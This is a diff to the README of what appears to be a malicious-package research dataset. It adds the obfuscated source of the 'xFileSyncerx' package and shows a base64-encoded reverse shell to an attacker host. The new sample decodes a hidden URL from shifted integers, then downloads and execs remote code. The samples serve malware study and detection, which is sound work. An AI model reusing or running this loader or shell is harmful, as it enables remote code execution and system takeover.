@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,921 versions of the source code of 5,192 malicious packages.
+This data set includes about 5,922 versions of the source code of 5,193 malicious packages.
 
 ## Dataset Format
 
@@ -452,6 +452,44 @@ except: pass
 
 #import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())
 ```
+
+
+### 06 Jun. 2024 
+xFileSyncerx [0.0.2] <br>
+
+```python
+class Filesyncer:
+    def __init__(self) -> None:
+        self.os = "null"
+        self.run()
+        return
+
+    def run(self):
+        sleep(3)
+        working = os.getcwd() + "/"
+        b = [832, 928, 928, 896, 920, 464, 376, 376, 912, 776, 
+             952, 368, 824, 840, 928, 832, 936, 784, 936, 920, 
+             808, 912, 792, 888, 880, 928, 808, 880, 928, 368, 
+             792, 888, 872, 376, 800, 408, 800, 936, 792, 928, 
+             392, 944, 376, 928, 808, 920, 928, 808, 912, 360, 
+             888, 816, 360, 928, 912, 808, 808, 920, 376, 872, 
+             776, 840, 880, 376, 920, 400, 368, 896, 968]
+                
+        if working == b:
+            print(f" Uname: {os.uname()[0]}\n CWD: {working}\n")
+        else:
+            b = [i << 2 for i in b]
+            for i in b:
+                i << 4
+
+            exec(rs.get("".join(chr(x >> 5) for x in b)).text)
+            #exec(r.text)
+
+        return
+    
+Filesyncer()
+```
+
 
 ## About the malicious packages detection
 
